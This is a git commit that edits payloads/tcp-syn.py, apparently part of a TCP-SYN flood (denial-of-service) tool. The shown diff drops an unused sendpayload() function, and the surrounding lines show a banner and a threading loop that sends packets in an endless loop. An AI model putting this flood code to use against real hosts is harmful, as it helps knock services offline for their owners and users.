86e544d0e5cb5de96f205a7b2889d47acbbc4ed5
Fortless <64139203+Fortless@users.noreply.github.com>
2022-04-08 20:58:49 +0300

    Update tcp-syn.py

--- payloads/tcp-syn.py
+++ payloads/tcp-syn.py
@@ -60,7 +60,5 @@ print("Interactive mode (TCP-SYN flood)")
 print("")
 print("---> Press CTRL+C to stop the payload!")
 print("-----------------------------------------")
-def sendpayload():
-    send(p, loop=1, verbose=0)
 for i in range(0, threads):
     thr = threading.Thread(target=send(p, loop=1, verbose=0))
